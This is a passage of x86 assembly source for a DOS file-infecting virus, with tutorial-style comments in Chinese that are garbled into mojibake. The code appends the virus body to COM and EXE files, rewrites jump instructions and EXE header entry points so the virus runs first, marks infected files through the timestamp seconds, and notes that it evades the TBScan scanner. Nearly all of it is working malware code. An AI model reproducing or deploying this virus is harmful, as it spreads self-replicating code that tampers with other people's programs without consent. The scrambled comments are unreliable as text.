                                                ; ¸õªº¤£°÷»· (¥u¯à©¹¤U¸õ 128 ©Î
                                                ; ©¹¤W¸õ 127 bytes)

infect_con1:

                xchg    bx,ax                   ; §âÀÉ®×ªº½s¸¹©ñ¨ì bx¡A¬°¦ó¤£¥Î
                                                ; mov bx,ax ©O? ¦]¬°µ{¦¡½X¤ñ¸û
                                                ; ¤p¡Axchg bx,ax ¥u­n 1 byte¡A
                                                ; ¦Ó mov bx,ax ­n 2 bytes¡C

                mov     ax,5700h                ; ³oÃä¬O­n§PÂ_ÀÉ®×¬O§_·P¬V¹L¤F
                call    callint21h              ; ¡A¦pªGÀÉ®×ªº¬í¼Æ¬O 2 ¬í¡A«h¥N
                and     cl,00011111b            ; ªí·P¬V¹L¤F¡A´N¤£­n¦A·P¬V¡C·í
                cmp     cl,00000001b            ; ax=5700h int 21h ®É¡A·|¶Ç¦^³o
                jne     infect_con2             ; ­ÓÀÉªº®É¶¡ (cx)¡B¤é´Á (dx)¡C
                jmp     infect_exit1            ; ·íµM¡Abx ­n¥ý³]¬°ÀÉ®×ªº½s¸¹¡C
infect_con2:
                push    cx                      ; ¥ý«O¯dÀÉ®×ªº®É¶¡»P¤é´Á¡C
                push    dx

                push    cs                      ; ±N ds ½Õ¾ã»P cs ¬Ûµ¥¡C
                pop     ds

                mov     ah,3fh                  ; ±qÀÉÀYÅª¤J 18h ­Ó bytes¡C¦]¬°
                mov     cx,18h                  ; ¤£ª¾¹D³o­ÓÀÉ¬O com ©Î exe¡A©Ò
                mov     dx,offset head_1        ; ¥H´N¥Ì¯ÜÅª¶i¨Ó§PÂ_...
                call    callint21h

                mov     ax,4202h                ; ²¾¨ìÀÉ®×ªº§À¤Ú¡A±o¨ìÀÉ®×ªº¤j
                xor     cx,cx                   ; ¤p (dx:ax)
                cwd
                call    callint21h

                push    ax                      ; ¥ý§â ax ­È»P dx ­È«O¯d¡A¦]¬°
                push    dx                      ; µ¥¤@¤U¯f¬r­n¥Î¨ì³o¨â­ÓªF¦è¡C
                                                ; ¦Ó dx:ax ´N¬O©ñÀÉ®×ªº¤j¤p¡C

                mov     ax,word ptr head_1      ; §âÀÉÀYªº¨â­Ó bytes Åª¤J¡A­Y¬O
                add     al,ah                   ; exe ÀÉ«h¥²¬° "MZ" ©Î "ZM"¡A¦ý
                cmp     al,'M'+'Z'              ; ¥[°_¨Ó³£¤@¼Ë "M"+"Z"="Z"+"M"
                je      infect_exe              ; ¦Ó¥BÁÙ¥i¥H¸úÁ× TBScan ªº±½´y
                                                ; ¦pªGÀÉÀYªº 2 bytes ¬O­È­è¦n¬O
                                                ; "M"+"Z"¡A¨º´N¥Î exe ÀÉ·P¬V¤è
                                                ; ªk¡C

infect_com:                                     ; ³o¤@¬q¬O­n·P¬V com ÀÉ¥Îªº¡C

                pop     dx                      ; §â dx:ax (ÀÉ®×ªø«×) ¨ú¦^¨Ó¡C
                pop     ax

                mov     byte ptr head_2,0e9h    ; ¥ý§â head_2 (¼g¤J¥ÎªºÀÉÀY) ²Ä
                                                ; ¤@­Ó byte ¶ñ 0e9h (jmp «ü¥O)

                sub     ax,3                    ; ¦¹®Éªº dx:ax ¬°ÀÉ®×ªø«×¡A¦]¬°
                mov     word ptr head_2+1,ax    ; ¬O com ÀÉ¡A¤£·|¶W¹L 64k¡A©Ò¥H
                                                ; dx ¤£¥ÎºÞ (¦]¬°¤@©w¬° 0)¡AµM
                                                ; «á ax ´N¬OÀÉ®×ªø«×¡A§âÀÉ®×ªø
                                                ; «×´î 3¡AÅÜ¦¨ 0e9h (jmp) «á­±
                                                ; ªº°¾²¾­È¡AµM«á¸õ¹L¥h¡C¤£¹L¦³
                                                ; ¤@®M³nÅé (4dos) ¨Ò¥~¡Acom ÀÉ
                                                ; ªºªø«×¶W¹L 64k¡A´N¥²»Ý¦A¥[¥H
                                                ; ³B²z¤F¡A¤£¹L§Ú­Ì¼È®É¤£°Q½×³o
                                                ; ®M³nÅé¡C

                add     ax,103h                 ; §â­è¤~ªº´î 3 ¤]¤@°_©è®ø¡AµM«á
                mov     word ptr file_offset,ax ; ÁÙ­n¦A¥[ 100h¡A©Ò¥H´NÅÜ¦¨¤F¥[
                                                ; 103h¡A§YÅÜ¦¨¡uÀÉ®×¤ºªº°¾²¾¡v

                mov     ah,40h                  ; ­è­è§â«ü¼Ð²¾¨ìÀÉ®×§À¤Ú¡A¬O¬°
                mov     cx,vir_size             ; ¤F¨úÀÉ®×ªø«×¥~¡AÁÙ¦³¤@­Ó¥Î³~
                cwd                             ; ¡A§Y¼g¤J¯f¬r¥DÅé¡C¦Ó cwd ·|¦b
                call    callint21h              ; ah < 80h ®ÉÅý dx ÅÜ¦¨ 0¡A¦b
                                                ; ah > 80h ©Î ah = 80h ®ÉÅý dx
                                                ; ÅÜ¦¨ 0ffffh¡C¦Ó¦b°O¾ÐÅé¤¤ (°õ
                                                ; ¦æ³o¸Ì®É¤w¸g¬O¦b°O¾ÐÅé¤¤Åo!)
                                                ; ªº°¾²¾¬O 0¡A¦A¥[¤W§Ú­Ì­n¼gªº
                                                ; ¦ì¸m­è¦n¬O 0¡A©Ò¥Hª½±µ¥Î cwd
                                                ; §Y¥i¡C¬°¦ó¤£¥Î xor dx,dx ©O?
                                                ; ¨º¬O¦]¬° cwd ¥u­n 1 byte¡A¦Ó
                                                ; xor dx,dx ­n 2 bytes¡C

                mov     ax,4200h                ; §âÀÉ®×«ü¼Ð²¾¨ìÀÉÀY¡A·Ç³Æ¼g¤J
                xor     cx,cx                   ; ÀÉÀY¡C¦P²z¡Acwd ¦b ah < 80h
                cwd                             ; ®É·|Åý dx ÅÜ 0
                call    callint21h

                mov     ah,40h

                mov     cx,3                    ; ­n¼g¤J¤T­Ó bytes¡C

                mov     dx,offset head_2        ; §â dx «ü¦V¼g¤J±M¥ÎªºÀÉÀY¡C

                call    callint21h

                jmp     infect_exit2            ; ¸õ¨ì infect_exit2¡A§@¼Ð°O¤ÎÃö
                                                ; ÀÉªº°Ê§@¡C

infect_exe:                                     ; ³oÃä¬O·P¬V exe ÀÉªºµ{¦¡½X¡C

                pop     dx                      ; §âÀÉ®×ªºªø«× (dx:ax) ¨ú¦^¨Ó¡C
                pop     ax

                push    cs                      ; §â es »P cs ¬Ûµ¥¡A¦]¬°µ¥¤@¤U
                pop     es                      ; ­n¥Î¨ì·h²¾ rep movsb¡C

                cld                             ; §â¤è¦VºX¼Ð³] 0¡A¥H§Kµ¥¤@¤U·h
                                                ; ²¾®É¥X¿ù

                mov     cx,18h                  ; §â head_1 ªº¤º®e½Æ»s¨ì head_2
                mov     si,offset head_1        ; ps: ¦¹®É cs=ds=es
                mov     di,offset head_2
                rep     movsb

                push    ax                      ; ¦¹®Éªº dx:ax ¬OÀÉ®×ªø«×¡A¦]¬°
                push    dx                      ; µ¥¤U·|§ïÅÜ¨ì dx:ax¡A©Ò¥H­n¥ý
                                                ; ¥Î push ax¡Bpush dx «O¯d°_¨Ó
                                                ; ¡C

                add     ax,vir_size             ; §âÀÉ®×ªø«×¥[¤W¯f¬rªø«×¡A¦]¬°
                adc     dx,0                    ; exe ÀÉªºªø«×¥i¥H¶W¹L 64k¡A©Ò
                                                ; ¥H dx ¥i¯à¤£¬° 0¡A­n§â dx ¥Î
                                                ; adc ¦A¥[¤@¦¸¡C

                mov     cx,200h                 ; ³Q°£¼Æ: dx:ax
                div     cx                      ; °£¼Æ: cx (200h)
                                                ; °Ó¼Æ: ax
                                                ; ¾l¼Æ: dx

                or      dx,dx                   ; ¦pªG¾l¼Æ¤£¬° 0¡A«h°Ó¼Æ (ax)
                je      infect_exe_con1         ; ­n¥[¤@¡C
                inc     ax
infect_exe_con1:
                mov     word ptr head_2+2,dx    ; ©ñÀÉ®×­¶¼Æ (512 bytes ¤@­¶)
                mov     word ptr head_2+4,ax    ; ©ñÀÉ®×¾l¼Æ

                pop     dx                      ; §â­è­è«O¯dªº dx:ax (ÀÉ®×ªø«×)
                pop     ax                      ; µ¹®³¥X¨Ó¡C

                mov     cx,10h                  ; ³Q°£¼Æ: dx:ax
                div     cx                      ; °£¼Æ: cx (10h)
                                                ; °Ó¼Æ: ax
                                                ; ¾l¼Æ: dx

                sub     ax,word ptr head_2+8    ; §â°Ó¼Æ (ax) ´î±¼ÀÉÀY¡C

                mov     word ptr head_2+14h,dx  ; ©ñ¤J ip ­È
                mov     word ptr head_2+16h,ax  ; ©ñ¤J cs ­È
                mov     word ptr file_offset,dx ; ©ñ¤JÀÉ®×¤¤ªº°¾²¾
                add     dx,8000h                ; ºâ sp (ip ¥[ 8000h)
                mov     word ptr head_2+0eh,ax  ; ©ñ¤J ss ­È (¦P cs)
                mov     word ptr head_2+10h,dx  ; ©ñ¤J sp ­È

                mov     ah,40h                  ; ±N¯f¬r¥DÅé¼g¤JÀÉ®×¡C¦P²z¡Acwd
                mov     cx,vir_size             ; ¦b ah < 80h ®É¥i¥H§â dx ÅÜ¦¨
                cwd                             ; 0
                call    callint21h

                mov     ax,4200h                ; ²¾¨ìÀÉÀY¡A·Ç³Æ¼g¤J¯f¬r¥DÅé¡C
                xor     cx,cx
                cwd
                call    callint21h

                mov     ah,40h                  ; ±N¯f¬r¥DÅé¼g¤J¡C
                mov     cx,18h
                mov     dx,offset head_2
                call    callint21h

infect_exit2:                                   ; com ·P¬V§¹¡Bexe ·P¬V§¹³Ì«á³£
                                                ; ·|¨ì³o¡C

                pop     dx                      ; ±N«O¯dªº cx¡Bdx (ÀÉ®×®É¶¡¡B¤é
                pop     cx                      ; ´Á) ®³¥X¨Ó¡A·Ç³Æ§@·P¬V¹Lªº
                                                ; mark

                and     cl,11100000b            ; ¥ý±N¬í¼ÆÅÜ 0¡A±N±N¬í¼Æ¥[¤G¡C
                inc     cx                      ; ps: dos ÀÉ®×¤ºªº¬í¼Æ¬O¨â¬í¤@
                                                ; ­Ó³æ¦ì¡C

                mov     ax,5701h                ; ³]©wÀÉ®×®É¶¡¡C
                call    callint21h
infect_exit1:
                mov     ah,3eh                  ; Ãö³¬ÀÉ®×¡C
                call    callint21h
infect_exit0:
                pop     es                      ; ±N«e­±«O¯dªº¼È¦s¾¹«ì´_¡A¥H§K
                pop     ds                      ; ¨t²Î·í±¼¡C
                popa

                jmp     newint21h_exit          ; ¸õ¦^­ì int 21h
;------------------------------------------------------------------------------
callint21h:                                     ; ©I¥s int 21h ªº°Æµ{¦¡¡C

                pushf                           ; ¥ý«O¯dºX¼Ð¡A¦A¥Î call (far)
                call    dword ptr cs:entint21h  ; ¥h°õ¦æ¡C
                ret

vir_size        equ     $-offset start          ; ¯f¬rªø«×¨ì¦¹¦Ó¤w¡C

vir_para        equ     (mem_size+0fh)/10h      ; ¯f¬r©Ò¥e¤j¤p¬O "mem_size"¡A¦Ó
                                                ; ¤£¬O "vir_size"¡A¦]¬°¤U­±ªº³¡
                                                ; ¥÷¤]­n¦Y°O¾ÐÅé¡C

head_2          db      18h dup(?)              ; ¼g¤J±M¥ÎªºÀÉÀY (com¡Bexe ¦@¥Î
                                                ; )

oldint21h       dd      ?                       ; «O¯d­ì©l int 21h ¤¤Â_¡C

entint21h       dd      ?                       ; «O¯d­ì©l int 21h ¤¤Â_¡A¦ý¥H«á
                                                ; ¥i¥H¥[±j¬°¡u­ì©l int 21h¡v¶i
                                                ; ¤JÂI¡C

mem_size        equ     $-offset start          ; ±qÀY¨ì³o©Ò»Ýªº°O¾ÐÅé¤j¤p¡C

                end     start                   ; §i¶D tasm µ{¦¡¨ì¦¹¬°¤î¡C
